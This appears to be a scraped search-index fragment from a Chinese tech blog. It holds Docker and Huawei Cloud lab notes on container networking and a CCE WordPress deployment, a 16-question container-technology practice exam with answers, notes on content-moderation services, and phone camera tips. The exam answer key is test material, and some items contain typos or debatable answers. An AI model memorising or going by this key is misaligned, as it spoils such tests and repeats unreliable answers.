多云容器平台（MCP）：基于多集群联邦技术完成多个不同区域、不同云的K8s集群与应用统一管理。 应用服务网络（ASM）：完成多个不同区域、不同云的Kubernetes集群上所部属应用的全局治理。\n高性价比 统一计算平台，业务混合部署，集群 利用率平均提升30% 昇腾，鲲鹏－高性价比异构算力\n极致性能 Volcano智能调度，批量任务效率平均 提升30% 30秒发放1000容器，满足极速弹性要求\n高效运维 Serverless服务，基础设施NoOps 自动+自定义指标弹性伸缩\n云原生未来发展趋势 云原生未来发展趋势 Kubernetes编排统一化，编排对象不断扩展延伸。 Kubernetes的编排对象持扩展\n应用侧围绕Kubernetes生态加速演。 服务治理Mesh化，加速传统应用转型。 服务治理与业务逻辑解耦。\n异构系统的统一治理。 应用服务Serverless化，更加聚焦业务的核心价值。 聚焦核心业务逻辑，极大提升应用开发效率。\n云原生服务部署形态多元化，多云将成为主流。 多云、多集群部署渐成为常态，未来将是编程式多云管理服务的时代。\n通过容器资源管理与容器网络和存储的操作 借助cgroup限制容器CPU利用率。 搭建容器bridge网络。 创建容器存储卷。\n容器网络 2.1 容器网络模型 前置步骤：配置镜像仓库\nyum -y install docker vi /etc/docker/daemon.json 按 “i” 键，添加如下内容：\n{ \u0026#34;registry-mirrors\u0026#34;: \\[ \u0026#34;https://docker.mirrors.ustc.edu.cn\u0026#34; ] } 按 Esc 键 → 输入 “:wq!” → 按回车键保存退出。\n查看镜像源有无修改\nsystemctl restart docker docker info ① 运行容器（host 网络模型）并验证 docker run -itd --network=host hub.c.163.com/library/centos 替换 “容器 ID” 后进入容器：\ndocker exec -it 容器ID bash 在容器内安装工具并查看网络信息：\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo yum install iproute -y ip addr 退出容器后，在宿主机验证网络信息：\nexit ip addr 说明：容器与宿主机共享网络 namespace，网络信息完全一致。\n保存容器镜像\ndocker commit 容器ID centos-iproute ② 运行容器（bridge 网络模型）并验证 docker run -itd --network=bridge centos-iproute # --network=bridge可省略（默认网桥为docker0） 替换 “容器 ID” 后进入容器查看网络信息：\ndocker exec -it 容器ID bash ip addr ③ 查看 docker0 网桥信息 exit docker network inspect bridge docker0 ④ 删除实验容器 docker container ls docker rm 容器ID -f 2.2 Docker bridge 网络 ① 创建用户自定义网桥 docker network create --driver bridge --subnet 173.18.0.0/16 --gateway 173.18.0.1 servicebridge01 查看网桥信息（替换 “网络 ID”）：\ndocker network inspect 网络ID ② 运行容器并挂载到自定义网桥 docker run -itd --network=servicebridge01 centos-iproute 查看容器网络配置（替换 “容器 ID”）：\ndocker inspect 容器ID ③ 容器挂载双网桥（默认 docker0 + 自定义网桥） docker run -itd centos-iproute # 先挂载默认docker0网桥 将容器添加到自定义网桥（替换 “网络 ID” 和 “容器 ID”）：\ndocker network connect 网络ID 容器ID docker exec -it 容器ID bash ip addr ④ 验证容器互通性 ping 容器IP # 替换为步骤②中容器的IP地址 按 Ctrl+C 终止进程。\n⑤ 删除实验容器 exit docker container ls docker rm 容器ID -f 云容器快速搭建 容器为app提供独立的受控的运行环境 ，轻量级的虚拟化操作系统。sandbox\n集装箱 容器 对比维度 物理集装箱 容器（软件容器） 打包对象 几乎支持所有类型的货物（如工业品、农产品等） 任何软件及其依赖（代码、运行环境、库文件等） 标准化 - 标准化尺寸（如 20 英尺、40 英尺）- 统一交接方式（起重机装卸） - 无需修改即可运行于多平台（虚拟机、物理机、公有云、私有云）- 遵循标准化镜像格式（如 Docker Image） 硬件 / 环境依赖 依赖运输工具（货船、火车、货车）及装卸设备 无底层硬件依赖，通过虚拟化技术抽象资源 隔离性 - 物理隔离货物，避免碰撞、污染- 可堆叠运输，互不影响 - 资源隔离（CPU、内存、存储）- 网络隔离与依赖隔离，避免组件冲突 自动化 标准化流程支持自动化装载、卸货、转运 - 标准操作指令（如docker run）- 支持 CI/CD、自动化测试、一键部署 高效性 减少货物拆箱 / 重装耗时，提升运输效率 - 轻量级（启动秒级）- 高移植性（镜像可快速迁移至不同环境） 操控性 点对点运输，无需开箱即可整体移动 镜像化部署，支持快速启停、迁移、扩展 职责分工 - 发货人：关注货物本身- 托运人：关注运输与装卸 - 开发者：聚焦代码逻辑- 运维人员：聚焦基础设施管理 Docker-容器技术的代名词 ·Docker是目前使用最广泛的容器技术，可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器 ·利用该技术，您可以将一款软件打包成一个标准化的软件开发单元，其中包括软件运行所需的全部内容：代码、运行时间、系统工具和系统库等。Docker使您能够在任何环境下快速、可靠、一致地部署应用程序。\n基本架构 Docker客户端（Client) Docker客户端通过命令行或者其他工具使用 Docker API与 Docker的守护进程通信。\nDocker主机 （Host） 一个物理或者虚拟的机器用于执行Docker守护进程和容器。\nDocker镜像(Images) V Docker镜像是用于创建Docker容器的模板。\nDocker容器（Container) V 容器是独立运行的─个或一组应用。\nDocker Daemon 服务端守护进程，负责接收客户端的指令，并处理这些请求（创建、运行、分发容器）。\nDocker仓库（Registry) V Docker仓库用来保存镜像，可以理解为代码控制中的代码仓库。 DockerHub提供了庞大的镜像集合供使用。\nCCE应用场景 传统IT架构渐进式转型\n提升业务上线效率\n业务负荷波动明显\n节省资源降低成本\n快速搭建 Step1：资源/环境 Step2：创建RDS Step3：创建CCE Step4:\t创建 Step5:\t访问 Step6:\t弹性伸缩\n搭建 WordPress 及弹性伸缩设置 步骤 1：创建虚拟私有云 VPC **什么是安全组？**安全组是一种虚拟防火墙，用于控制虚拟私有云（VPC）内实例的入站和出站流量，通过配置允许或拒绝规则实现网络访问控制。\n创建 VPC 操作步骤： 进入控制台，在 “服务列表” 下点击 “网络 \u0026gt; 虚拟私有云”，进入网络控制台页面。\n点击 “创建虚拟私有云”，按以下信息配置：\n基本信息\n当前区域：华北 - 北京四\n名称：myvpc\n网段：192.168.0.0/16\n默认子网\n名称：subnet-myvpc\n其余配置保持默认\n返回 “虚拟私有云” 界面，确认已创建的 myvpc。\n在网络控制台左侧菜单栏点击 “访问控制\u0026gt; 安全组”，进入安全组页面，选择 default 默认安全组右侧的【配置规则】。\n点击 “添加规则”，为 default 安全组添加入方向规则，放通 3306 及 80 端口。\n步骤 2：创建 RDS 关系型数据库 **什么是 RDS（华为云关系型数据库）？**RDS 是华为云提供的关系型数据库服务，支持 MySQL、SQL Server 等引擎，提供弹性扩展、高可用性等功能，简化数据库管理。\n创建 RDS 实例操作步骤： 打开控制台，在 “服务列表” 下选择 “数据库 \u0026gt; 云数据库 RDS”，点击 “购买数据库实例”。\n配置实例参数：\n计费模式：按需计费\n区域：华北 - 北京四\n数据库引擎：MySQL\n数据库版本：5.7\n实例类型：单机\n性能规格：通用型 | 2 核 | 4GB（如售罄选相似规格）\n存储空间：40GB\n实例名称：rds-web\n管理员密码：自行设置（后续需用）\n虚拟私有云：选择 myvpc 及 subnet-myvpc\n数据库端口：3306\n安全组：选择 default\n时区：北京，其余默认\n点击 “立即购买” 并 “提交”，实例创建需 6-10 分钟。\n等待期间可同步进行步骤 4，创建完成后记录数据库实例的内网地址。\n进入数据库管理界面，在 “账号管理” 创建账号（主机 IP 输入 %），在 “数据库管理” 创建数据库并授权。\n步骤 3：在 CCE 上创建集群并添加节点 **什么是 CCE（华为云容器引擎）？**CCE 是华为云提供的容器引擎服务，支持 Kubernetes 集群管理，用于部署、扩展和管理容器化应用。\n创建集群及节点操作步骤： 返回控制台，在 “服务列表” 下选择 “容器 \u0026gt; 云容器引擎 CCE”，进入 CCE 页面。\n选择购买 CCE Standard 集群，配置参数：\n计费模式：按需计费\n集群名称：test\n版本：v1.30 或推荐版本\n集群规模：50 节点\n网络模型：容器隧道网络\n虚拟私有云：选择 myvpc\n控制节点子网：选择 subnet-myvpc\n其余配置默认\n依次完成插件选择（默认）、规格确认，提交创建集群（约 5 分钟）。\n集群创建完成后，点击 “创建节点”，配置参数：\n计费方式：按需计费\n节点规格：通用型 | s6.xlarge.2|4 核 | 8GB（若售罄选相近规格）\n操作系统：EulerOS 2.9\n登录方式：密码（自行设置）\n虚拟私有云：myvpc\n节点子网：subnet-myvpc\n弹性公网 IP：自动创建（按流量计费，带宽 5M）\n节点数量：2 台，其余默认\n确认规格后提交，节点创建需 4 分钟，确认状态为 “运行中”。 步骤 4：创建 wordpress 工作负载 操作步骤： 在 CCE 集群中进入 “工作负载” 界面，点击 “创建负载”。\n配置基本信息：\n负载类型：无状态负载\n名称：wordpress\n实例数量：1\n镜像选择：镜像中心搜索 wordpress，版本 php7.3\n添加环境变量（需提前完成 RDS 账号及数据库创建）： WORDPRESS_DB_HOST：RDS 内网地址：3306\nWORDPRESS_DB_NAME：RDS 创建的数据库名称\nWORDPRESS_DB_USER：RDS 创建的账号名称\nWORDPRESS_DB_PASSWORD：RDS 账号密码\n服务配置： Service 名称：wordpress\n访问类型：负载均衡\n端口配置：TCP，容器端口 80，服务端口 80\n负载均衡器：共享型，自动创建（名称 wordpress）\n确认后创建工作负载，状态变为 “运行中” 后，获取外部访问地址。\n访问地址完成 wordpress 安装配置（语言简体中文，设置站点标题、用户名、密码等）。\n步骤 5：配置网站应用弹性伸缩 操作步骤： 进入 CCE test 集群，选择 “工作负载\u0026gt; wordpress”。\n手动扩容：调整实例个数为 3，确认实例数扩容至 3 个。\n弹性伸缩策略配置：\n进入 “弹性伸缩”，安装 CustomedHPA 插件（保持默认设置）。\n创建 CustomedHPA 策略：\n实例范围：1-3\n冷却时间：1 分钟\n触发条件：CPU 利用率 \u0026lt; 50%\n执行操作：减少 1 个实例\n确认策略创建成功（状态 “已启用”），等待 2 分钟观察实例自动缩减。\n利用公有镜像搭建 wordpress 并完成伸缩设置。\nTest 容器技术考试题库解析 一、容器管理技术 题目：以下哪项不属于容器管理技术？\n选项：\n◯ A. Swarm\n◯ B. Mesos\n◯ C. Kubernete\n◯ D. Spark\n答案：D\n解析：\nSpark 是分布式计算框架（大数据处理），而 Swarm/Mesos/Kubernetes 属于容器编排工具。 二、容器运行时 题目：容器的 Runtime 包含以下哪几种？（多选）\n选项：\n▢ A. Lxc\n▢ B. Coreos\n▢ C. Runc\n▢ D. Rkt\n答案：A、C、D\n解析：\nLxc（基础容器技术）、Runc（OCI 标准运行时）、Rkt（安全容器引擎）是运行时；CoreOS 是操作系统而非运行时。 三、容器仓库 题目：下列属于容器公共仓库的有哪项？（多选）\n选项：\n▢ A. Docker Hub\n▢ B. Quay.io\n▢ C. Habor\n▢ D. Registry\n答案：A、B\n解析：\nDocker Hub 和 Quay.io 是开放公共仓库；Harbor/Registry 主要用于私有部署。 四、Cgroup 功能 题目：Cgroup 的功能有哪些？（多选）\n选项：\n▢ A. 资源限制\n▢ B. 优先级分配\n▢ C. 资源分配\n▢ D. 资源挂载\n答案：A、B、C\n解析：\nCgroup 管理资源限制/分配/优先级；挂载功能由 VFS 实现。 五、Docker 分层结构 题目：下列有关 Docker 分层结构描述正确的是哪项？（多选）\n选项：\n▢ A. 底层只读\n▢ B. 容器层可读写\n▢ C. 镜像层改变时复制到容器层\n答案：全选\n解析：\n镜像层只读，容器层可写，修改时采用 Copy-on-Write 机制。 六、Docker 运行环境 题目：Docker 容器可以在以下哪些环境中运行？（多选）\n选项：\n▢ A. 物理机\n▢ B. 虚拟机\n▢ C. 公有云\n▢ D. 私有云\n答案：全选\n解析：\n只要操作系统支持容器运行时（如 Linux/Windows），Docker 即可运行。 七、Namespace 隔离 题目：Docker 中 namespace 隔离了以下哪项属性？（多选）\n选项：\n▢ A. Mount\n▢ B. UTS\n▢ C. IPC\n▢ D. PID\n答案：全选\n解析：\nMount（文件系统）、UTS（主机名）、IPC（进程通信）、PID（进程号）均由 Namespace 隔离。 八、定制容器镜像 题目：定制私有化的镜像，可以使用下列哪几种方式？（多选）\n选项：\n▢ A. Docker pull\n▢ B. Docker commit\n▢ C. Docker run\n▢ D. 编写 Dockerfile 后执行\n答案：B、D\n解析：\ndocker commit 保存容器状态，Dockerfile 构建新镜像，其他命令不生成镜像。 九、容器化适用场景 题目：具有下述特点的应用最适合容器化部署？（多选）\n选项：\n▢ A. 采用微服务架构\n▢ B. 静态资源配置\n▢ C. 水平扩展\n▢ D. 应用更新频繁\n答案：A、C、D\n解析：\n容器适合微服务/弹性伸缩/频繁更新；静态资源分配更适合物理机/虚拟机。 十、容器操作命令 题目：Docker 用户可以通过哪个命令将容器提交为镜像？\n选项：\n◯ A. Docker run\n◯ B. Docker commit\n◯ C. Docker images\n◯ D. Docker pull\n答案：B\n解析：\ndocker commit 将容器当前状态保存为新镜像。 十一、镜像特性 题目：以下关于镜像、容器和应用关系的说法，错误的是？\n选项：\n◯ A. 镜像是静态定义\n◯ B. 容器可被启停管理\n◯ C. 镜像内容在构建之后可以被改变\n◯ D. 镜像提供容器运行所需文件\n答案：C\n解析：\n镜像具有不可变性，构建后无法直接修改。 十二、容器 vs 虚拟机 题目：关于容器和传统虚拟机对比的说法，错误的是？\n选项：\n◯ A. 容器虚拟化开销低\n◯ B. 容器隔离性更好\n◯ C. 容器占用磁盘空间小\n◯ D. 宿主机可运行更多容器\n答案：B\n解析：\n虚拟机通过 Hypervisor 实现硬件级隔离，安全性优于容器。 十三、CCE 核心功能 题目：应对突发浪涌，云容器引擎需支持什么功能？\n选项：\n◯ A. 弹性伸缩\n◯ B. 调度策略\n◯ C. 高可用\n◯ D. 技术共享\n答案：A\n解析：\n弹性伸缩可自动扩缩节点和容器副本以应对流量变化。 十四、CCE 产品优势 题目：云容器引擎 CCE 产品优势表现在哪方面？\n选项：\n◯ A. 简单易用、高性能、高可靠、开放兼容\n◯ B. 简单易用、高效率、高可靠、开放兼容\n◯ C. 简单易用、高效率、启动快、开放兼容\n◯ D. 简单易用、高性能、启动快、开放兼容\n答案：A\n解析：\nCCE 核心优势：易用性、性能、可靠性、兼容性。 十五、容器技术优势 题目：以下哪项不属于 Docker 容器的好处？\n选项：\n◯ A. 更高效的虚拟化\n◯ B. 更安全的运行\n◯ C. 更快的交付部署\n◯ D. 管理更加复杂\n答案：D\n解析：\n容器化实际简化了环境管理，D 选项描述错误。 十六、CCE 使用步骤 题目：使用云容器引擎的正确步骤是？\n选项：\n◯ A. 创建应用→上传镜像→创建集群\n◯ B. 创建集群→创建应用→上传镜像\n◯ C. 创建集群→上传镜像→创建应用\n◯ D. 上传镜像→创建集群→创建应用\n答案：C\n解析：\n必须先有集群环境（资源池）和镜像（软件包），才能部署应用。 ","permalink":"https://qfsyso.github.io/posts/docker-devops/","summary":"云原生应用十二要素原则解析表 原则 核心价值 实现方法 技术案例 1. 基准代码 快速交付；合理划分边界 单一代码库+多环境部署，版本控制统一管理 Git仓库管理，Kubernetes多集群部署 2. 依赖 提升开发效率；排除意外风险 显式声明依赖+隔离环境（容器化） Docker镜像打包依赖，Helm Chart管理应用包 3. 配置 软件发布管理；环境无差别 配置与代码分离→环境变量注入 Kubernetes ConfigMap/Secret动态加载 4. 后端服务 弹性/敏捷；解耦状态管理 将慢速进程（如DB/队列）转为RESTful服务 Redis缓存服务，消息队列(Kafka)独立部署 5. 构建发布运行 持续交付；流水线自动化 CI/CD全流程自动化（构建→测试→部署） Jenkins/GitLab CI流水线，K8s Rolling Update 6. 进程 云兼容性；无状态设计 应用无状态化，会话数据外置后端服务 会话存储Redis，文件存储OSS 7. 端口绑定 自包含服务；独立暴露接口 服务直接监听端口，不依赖Web服务器转发 Spring Boot内嵌Tomcat，gRPC直连 8. 并发 自动弹性伸缩 水平扩展替代垂直扩展，依赖云平台弹性能力 Kubernetes HPA自动扩缩容 9. 易处理 快速故障恢复 断路器模式+优雅终止，进程可随时启停 Istio服务熔断，K8s Liveness探针 10. 环境等价 可靠性；开发与生产环境一致 容器化保证环境一致性，禁用环境特殊配置 Docker跨环境运行，开发环境Minikube 11. 日志 实时系统监控 日志作为事件流→集中式管理 EFK栈(Elasticsearch+Fluentd+Kibana) 12. 管理进程 运维效率；运营解耦 管理任务（如DB迁移）作为独立进程，与主应用隔离 K8s Job/CronJob执行批处理任务 特性 云原生应用 传统应用 可预测性 符合弹性框架，通过容器编排和微服务实现可预测行为 不可预测，批量发布易引发单点故障，扩展能力有限 操作系统依赖 抽象化（容器技术隔离OS依赖，实现跨平台运行） 强依赖（需特定OS环境，迁移困难） 资源调度 弹性伸缩（按需自动分配资源，利用率＞70%） 冗余静态（预留资源应对峰值，利用率＜40%） 团队协作 DevOps驱动（开发运维一体化，自动化流水线） 部门墙隔离（开发/测试/运维独立，沟通成本高） 开发模式 敏捷迭代（CI/CD支持每日多次部署） 瀑布模型（数月/年周期发布，变更困难） 服务架构 微服务（独立部署、高内聚低耦合） 单体架构（模块紧耦合，牵一发而动全身） 运维能力 自动化（K8s实现自愈、监控、扩缩容） 手动操作（人工监控、故障排查效率低） 故障恢复 秒级恢复（容器快速重启+服务网格流量调度） 小时级恢复（依赖备份还原，流程复杂） 云原生架构模式:微服务架构 云原生架构演进原则 01.","title":"Docker DevOps"},{"content":"智能信息过滤和图片鉴别 智能信息过滤，屏蔽网上的色情、暴力、反动等不良信息，让上网的环境更干净。\n文字信息过滤 智能策略定制，高效过滤色情、广告、涉政、暴恐等多类垃圾文字及敏感词、违禁变种。\n图像信息过滤 领先图像识别算法，精准过滤涉黄、推广、暴恐、涉政、其他个性化定义的违规图片。 函数工作流\n文字应用场景 1.有效拦截聊天中含有涉黄、暴恐等违法内容。 2.识别用户昵称、签名等违规内容。 3.识别论坛灌水、广告等垃圾内容: 4.电商评论中文字筛查\n图像应用场景 1.识别用户头像中的违规内容 2.电商评论中图片筛查\n实现智能信息过滤所需的技术 1.分布式消息服务Kafka: 创建Kafka实例，并创建对应主题，记录实例基本信息中的连接地址信息，用来后面推送消息使用。 2.函数工作流:创建函数，为函数创建触发器，通过轮询的方式，获取Kafka实例中的对应信息。 3.对象存储服务OBS:创建OBS桶用来保存程序包。 4.统一身份认证服务IAM:创建委托，给FunctionGraph函数赋权，确保函数能够访问到Kafka对应资源。\n分布式消息服务Kafka概述 分布式消息服务Kafka是一个高吞吐、高可用的消息中间件服务，，适用于构建实时数据管道、流式数据处理、第三方解耦、流量削峰去谷等场景，具有大规模、高可靠、高并发访问、可扩展且完全托管的特点，是分布式应用上云必不可少的重要组件。 Topic 生产者 消费者 节点 分区 副本\n分布式消息服务Kafka与智能信息过滤 使用分布式消息服务Kafka，提供用户发送消息的平台\n创建Kafka实例 -\u0026gt;用于信息过滤 -\u0026gt;创建Kafka主题 -\u0026gt;完成Topic创建\n函数工作流概述 函数工作流(FunctionGraph)是华为云提供的一款无服务器(Serverless)计算服务，无服务器计算是一种托管服务，服务提供商会实时为你分配充足的资源，而不需要预留专用的服务器或容量，真正按实际使用付费。\n函数工作流使用流程: 开始 创建函数 创建工作流触发器 创建工作流 生成事件触发工作流执行 查看步骤执行的详细信息 结束\n函数工作流与智能信息过滤 创建函数:提供信息处理的软件加上计算资源。 创建触发器:通过创建触发器实现添加Kafka事件源，将函数与Kafka关联函数可以获取Kafka中的对应信息。 通过对读取信息进行处理，判断信息是否敏感，是否符合发布。\n创建函数 创建触发器 事件源触发 信息处理\n对象存储服务OBS 对象存储服务(Object Storage Service，OBS)是一个基于对象的海量存储服务，为客户提供海量、安全、高可靠、低成本的数据存储能力。 对象object: 是OBS中数据存储的基本单位，用户上传至OBS的数据都以对象的形式保存在桶中。 桶Bucket: 是OBS中存储对象的容器\n块存储服务 相当于硬盘，速度快，共享性差。 文件存储 共享性快，速度慢。\n对象存储原理是创建一个哈希环，每个文件数据创建索引，通过索引快速找到。\n对象存储服务OBS与智能信息过滤 创建函数时，上传ZIP包的大小限制为不超过50M，如果超过50M，需要将程序包上传至OBS桶，从OBS桶中引用。所以需要创建OBS桶用来保存程序包。 在文字信息过滤中， OBS存储的程序包中包含触发函数运行的敏感信息Kafka的生产者发布的消息会触发函数，函数会读取信息并处理。同样的在图片鉴别中，OBS除了存储程序包，还是触发图片处理函数运行的事件源。\n总结: 在文字信息过滤中，OBS=存储空间+触发函数的事件源 在图片鉴别中，OBS=存储空间+触发函数的事件源\n统一身份认证服务IAM 统一身份认证(Identity and Access Management，简称IAM)，是提供用户身份认证、权限分配、访问控制等功能的身份管理服务。 IAM可以帮助您安全地控制对华为云资源的访问。您可以使用IAM创建以及管理用户，并使用权限来允许或拒绝他们对华为云资源的访问。\n统一身份认证服务IAM与智能信息过滤 在IAM中，需要创建委托，给FunctionGraph函数赋权，确保FunctionGraph函数能够访问到Kafka对应资源。\n实现智能图片鉴别所需的华为云技术 人工智能服务:使用图片检测功能。 函数工作流服务:构建实现图片鉴黄功能的函数。 API网关:提供图片鉴黄功能的API。 对象存储服务OBS:托管前端代码，提供静态网站。 统一身份认证服务IAM:创建函数工作流服务委托使函数工作流服务能够访问API网关、图片检测、对象存储服务的资源。\n人工智能服务 本例中我们使用的是人工智能服务中的内容审核服务。内容审核(Content Moderation)，是基于图像、文本、视频检测技术，可自动检测涉黄、广告、涉暴、涉政等内容。\n人工智能服务与智能信息过滤 本例中我们使用的是人工智能服务中的内容审核服务。内容审核服务以开放API(Application Programming Interface，应用程序编程接口)的方式提供给用户，用户通过实时访问和调用API获取推理结果，帮助用户自动采集关键数据，打造智能化业务系统，提升业务效率。本例中内容审核服务就是结合API帮助用户采集相关数据并分析是不是色情等非法和敏感图像信息。\nAPI网关 API网关(APIGateway)是为您提供安全可靠的API托管服务，帮助您轻松构建、管理和部署任意规模的API。借助API网关，可以简单、快速、低成本地实现内部系统集成、业务能力开放及业务能力变现。作为API调用者，可以获取并调用API提供者在API网关开放的API，减少开发时间与成本。\n实现智能信息过滤和图片鉴别的实践 Step1:资源/环境准备 Step2:构建程序 Step3:创建函数 Step4:添加事件源 Step5:结果验证\n资源/环境准备 创建OBS桶 创建Kafka实例 创建Kafka主题 创建委托\n构建程序 编辑程序包 上传代码至OBS桶\n创建函数 函数名称输入: \u0026ldquo;fss examples message filtering 所属应用选择默认的“default”。 描述输入“中文过滤” 委托名称选择创建委托中创建的serverless dms运行时语音选择:“Python2.7’ 函数执行入口输入:\u0026ldquo;index.handler 代码选择“从OBS上传文件'\n添加事件源 触发器类型选择分布式消息服务(Kafka)\n结果验证 登录分布式消息服务，进入fssexamples message filtering函数详情页点击日志，进入日志界面，会看到日志中有“消息中存在太多的敏感词，禁止发布”\n图片鉴黄的实现 Step1:资源/环境准备 Step2:构建后端功能程序 Step3:构建前端功能程序 Step4:结果验证\n资源/环境准备(1) 开通图片检测功能 创建委托 创建API分组 创建OBS桶 多AZ存储\n构建后端功能程序 创建后端功能函数 为后端函数创建APIG触发器\n函数 模板:选择空白模板。 函数名称:输入“AIDemo“ 所属应用选择默认的“default” 委托名称:选择“serverless trust” 运行时语言:选择“Node.js 6.10” 函数执行入口:输入“index.handler”\n函数模拟器 API名称:输入AIDemo 分组:选择function 分组的创建过程请参考创建API分组。 发布环境:选择RELEASE 安全认证:选择NONE 请求协议:选择HTTP 后端超时:输入5000\n构建前端功能程序(1) 编辑程序 上传程序文件至OBS桶 设置静态网站托管\n1.修改/functiongraph/assets/config,apis.json文件中checklmage的值，更改为在为后端函数创建APIG触发器中创建的APIG触发器URL。(匹配) 2.上传程序文件至OBS桶 3.设置静态网站托管\n结果验证 在浏览器地址栏，输入构建前端功能程序中前端程序OBS托管地址，进入图片检测界面，上传图片，开始检测，获得检测结果，图片不合规。\nRDS GaussDB (for MySQL) 128TB 支持X86 鲲鹏 性能对于原生提升7倍\nPG 支持更复杂的数据类型 高性能 快速响应\n场景 网站/IoT/开发测试/企业应用 即开即用/稳定可靠/便携管理/弹性伸缩/安全\nopenGauss 金融领域 ARM openEuler X86 CentOS\nopenGauss应用场景 大并发、大数据量、以联机事务处理为主的交易型应用，如电商、金融、O20、电信CRM/计费等，应用可按需选择不同的主备部署式。 物联网数据 在工业监控和远程控制、智慧城市的延展、智能家居、车联网等物联网场景下，传感监控设备多，采样率高，数据存储为追加模型，操作和分析并重的场景。\n#负载均衡ELB 流量分发 灵活扩展 消除单点故障 跨可用区业务容灾部署\nAI零售客户分类 ModelArt AI 人工智能 机器学习 实现客户分群可视化分析\n机器学习 算法 模型构建 数据集 Jupyter Notebook sklearn scikit-learn\n环境撘建 数据同步 数据导入 数据预处理 K值的选择 模型构建 模型使用 结果可视化\nIoT 自贩机 智慧水务 智慧路灯 智慧电梯 智慧抄表\n设备 物联网平台设备接入 OBS 对象服务存储（DIS 数据接入服务 - MRS MapReduce服务 - DLV 数据可视化服务）\n","permalink":"https://qfsyso.github.io/posts/information-recognition/","summary":"智能信息过滤和图片鉴别 智能信息过滤，屏蔽网上的色情、暴力、反动等不良信息，让上网的环境更干净。\n文字信息过滤 智能策略定制，高效过滤色情、广告、涉政、暴恐等多类垃圾文字及敏感词、违禁变种。\n图像信息过滤 领先图像识别算法，精准过滤涉黄、推广、暴恐、涉政、其他个性化定义的违规图片。 函数工作流\n文字应用场景 1.有效拦截聊天中含有涉黄、暴恐等违法内容。 2.识别用户昵称、签名等违规内容。 3.识别论坛灌水、广告等垃圾内容: 4.电商评论中文字筛查\n图像应用场景 1.识别用户头像中的违规内容 2.电商评论中图片筛查\n实现智能信息过滤所需的技术 1.分布式消息服务Kafka: 创建Kafka实例，并创建对应主题，记录实例基本信息中的连接地址信息，用来后面推送消息使用。 2.函数工作流:创建函数，为函数创建触发器，通过轮询的方式，获取Kafka实例中的对应信息。 3.对象存储服务OBS:创建OBS桶用来保存程序包。 4.统一身份认证服务IAM:创建委托，给FunctionGraph函数赋权，确保函数能够访问到Kafka对应资源。\n分布式消息服务Kafka概述 分布式消息服务Kafka是一个高吞吐、高可用的消息中间件服务，，适用于构建实时数据管道、流式数据处理、第三方解耦、流量削峰去谷等场景，具有大规模、高可靠、高并发访问、可扩展且完全托管的特点，是分布式应用上云必不可少的重要组件。 Topic 生产者 消费者 节点 分区 副本\n分布式消息服务Kafka与智能信息过滤 使用分布式消息服务Kafka，提供用户发送消息的平台\n创建Kafka实例 -\u0026gt;用于信息过滤 -\u0026gt;创建Kafka主题 -\u0026gt;完成Topic创建\n函数工作流概述 函数工作流(FunctionGraph)是华为云提供的一款无服务器(Serverless)计算服务，无服务器计算是一种托管服务，服务提供商会实时为你分配充足的资源，而不需要预留专用的服务器或容量，真正按实际使用付费。\n函数工作流使用流程: 开始 创建函数 创建工作流触发器 创建工作流 生成事件触发工作流执行 查看步骤执行的详细信息 结束\n函数工作流与智能信息过滤 创建函数:提供信息处理的软件加上计算资源。 创建触发器:通过创建触发器实现添加Kafka事件源，将函数与Kafka关联函数可以获取Kafka中的对应信息。 通过对读取信息进行处理，判断信息是否敏感，是否符合发布。\n创建函数 创建触发器 事件源触发 信息处理\n对象存储服务OBS 对象存储服务(Object Storage Service，OBS)是一个基于对象的海量存储服务，为客户提供海量、安全、高可靠、低成本的数据存储能力。 对象object: 是OBS中数据存储的基本单位，用户上传至OBS的数据都以对象的形式保存在桶中。 桶Bucket: 是OBS中存储对象的容器\n块存储服务 相当于硬盘，速度快，共享性差。 文件存储 共享性快，速度慢。\n对象存储原理是创建一个哈希环，每个文件数据创建索引，通过索引快速找到。\n对象存储服务OBS与智能信息过滤 创建函数时，上传ZIP包的大小限制为不超过50M，如果超过50M，需要将程序包上传至OBS桶，从OBS桶中引用。所以需要创建OBS桶用来保存程序包。 在文字信息过滤中， OBS存储的程序包中包含触发函数运行的敏感信息Kafka的生产者发布的消息会触发函数，函数会读取信息并处理。同样的在图片鉴别中，OBS除了存储程序包，还是触发图片处理函数运行的事件源。","title":"Information Recognition"},{"content":"红枫人像模式 【干货1：光影通透感】 打开相机→人像模式→选择「红枫原色滤镜」，搭配F1.4可变光圈（光线暗时自动开大），Live House也能拍出电影感！皮肤质感直接提升50%！ 【干货2：微距彩蛋】 长焦镜头不仅能拍远景，切换「超级微距」模式，2.5cm怼脸拍睫毛根根分明，美妆博主都直呼内行！\n光斑选「旋焦」！逆光秒变星芒氛围 👉 人像模式→点顶部「光斑」→选「旋焦」拍侧脸： ✓ 背景玻璃反光变旋转星环，发丝自带金边，原图直出不用修！ ✓ 普通虚化像贴纸，旋焦让背景有「呼吸感」，随手拍都是电影截图\n电影模式藏得深！鎏金滤镜封神 👉 左滑到「更多」→开「电影模式」选「鎏金」： 暖黄颗粒感直接拉满！拍复古小店/蛋糕摆拍，秒变90年代老电影质感，发朋友圈被问“在哪拍的微电影”～\n动态追焦拍视频！端盘子不糊片 👉 长按对焦框锁定物体： 拍vlog端蛋糕走动，镜头全程锁食物，奶油晃动细节超清晰！拍店员拉花，奶泡上的字放大都不模糊～\n懒人公式：逆光+旋焦光斑+鎏金滤镜，随手拍都是封面！ 华为Nova14Pro 拍照神器\n**打工人必薅！Nova14 Pro 5个效率神技 （封面：手机分屏显示文档+微信，桌面浮着「智慧识屏」按钮）\n长按屏幕2秒→合同转Word！ 👉 智慧识屏提取图片文字，表格/手写都能认，地铁10分钟搞定文件编辑，老板夸“反应快”～\n三指上滑分屏！开会摸鱼两不误 👉 左腾讯文档开会，右微信回消息，侧边栏拖淘宝变悬浮窗比价，摸鱼工作无缝切换（嘘～）\n备忘录扫描→纸质笔记变电子档！ 拍3页手写会议纪要，自动识别文字+排版，准确率99%，导出PDF直接发群，省掉半小时狂记时间！\n花 48mm F/2.2 1/100s \u0026amp; 200s ISO200 人 72mm F2.4 1/50s ISO320 ISO600\n相册 编辑 AI移图\n雨 M 测光点 ISO 400 S 1/100 F AF-C AWB 白平衡调至4200K 拍雨滴：快门S：1/1000 ISO：1600 拍雨丝：快门S：1/100 ISO：100 拍雨条：快门S：1/10 ISO：50\n","permalink":"https://qfsyso.github.io/posts/hw-pic/","summary":"红枫人像模式 【干货1：光影通透感】 打开相机→人像模式→选择「红枫原色滤镜」，搭配F1.4可变光圈（光线暗时自动开大），Live 